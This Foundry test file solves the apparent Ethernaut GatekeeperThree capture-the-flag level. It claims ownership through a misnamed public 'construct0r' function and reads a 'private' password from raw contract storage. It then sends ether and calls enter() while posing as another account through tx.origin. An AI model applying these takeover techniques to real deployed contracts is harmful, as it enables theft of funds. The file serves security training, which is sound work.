// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperThree, SimpleTrick} from "../src/GatekeeperThree.sol";

contract GatekeeperThreeTest is Test {
    GatekeeperThree public gt3;
    SimpleTrick simpleTrick;

    address alice = makeAddr("alice");
    address ravin = makeAddr("ravin");

    function setUp() public {
        vm.warp(1641070800);
        vm.prank(alice);
        gt3 = new GatekeeperThree();
        gt3.createTrick();
        simpleTrick = gt3.trick();
    }

    function testAttack() public {
        vm.startPrank(address(this), ravin);

        gt3.construct0r();
        assertEq(gt3.owner(), address(this));

        // read SimpleTrick's password
        bytes32 pwdSlot = vm.load(address(simpleTrick), bytes32(uint256(2)));
        gt3.getAllowance(uint(pwdSlot));
        assertEq(gt3.allowEntrance(), true);

        (bool ok, ) = address(gt3).call{value: 0.002 ether}("");
        require(ok, "send ETH failed");

        gt3.enter();

        assertEq(gt3.entrant(), ravin);

        vm.stopPrank();
    }
}
